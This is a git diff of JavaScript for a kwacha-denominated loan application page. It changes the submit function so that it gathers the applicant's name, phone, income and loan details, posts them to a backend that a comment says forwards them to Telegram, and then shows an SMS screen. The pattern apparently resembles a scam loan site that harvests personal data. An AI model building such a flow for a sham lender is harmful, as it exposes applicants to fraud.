@@ -56,7 +56,6 @@ function updateLoanValue() {
     const amount = parseInt(amountSlider.value);
     const term = parseInt(termSlider.value);
     
-    // Numbers will now format with commas automatically (e.g. 15,000)
     amountDisplay.innerText = `ZMW ${amount.toLocaleString()}`;
     termDisplay.innerText = `${term} Months`; 
 
@@ -123,10 +122,50 @@ function prevStep(stepNumber) {
     }
 }
 
-function submitApplication() {
+// NEW: Function to submit data to Telegram via the backend
+async function submitApplication() {
+    // Show the processing screen immediately
     showScreen('processing-screen');
 
-    setTimeout(() => {
-        showScreen('sms-screen');
-    }, 3000); 
+    // 1. Gather the data from the form
+    // We use querySelector to grab the inputs since they don't have IDs yet
+    const applicationData = {
+        loanAmount: document.getElementById('formLoanAmount').value,
+        loanTerm: document.getElementById('formLoanTerm').value,
+        loanType: document.getElementById('loanType').value,
+        firstName: document.querySelector('#step-2 input[placeholder="First Name"]').value || 'Not provided',
+        lastName: document.querySelector('#step-2 input[placeholder="Last Name"]').value || 'Not provided',
+        phone: document.querySelector('#step-2 input[type="tel"]').value || 'Not provided',
+        purpose: document.querySelector('#step-1 input[placeholder="e.g., Business expansion"]').value || 'Not provided',
+        empStatus: document.getElementById('empStatus').value,
+        annualIncome: document.querySelector('#step-3 input[placeholder="e.g., 5000000"]').value || 'Not provided'
+    };
+
+    try {
+        // 2. Send data to the backend API we created in server.js
+        const response = await fetch('/api/submit-application', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(applicationData)
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+            // 3. If successful, move to the SMS screen (or error screen)
+            // We add a slight delay so the user sees the processing spinner
+            setTimeout(() => {
+                showScreen('sms-screen'); 
+            }, 1500);
+        } else {
+            alert("Something went wrong. Please try again.");
+            showScreen('main-screen');
+        }
+    } catch (error) {
+        console.error("Error:", error);
+        alert("Network error. Please try again.");
+        showScreen('main-screen');
+    }
 }
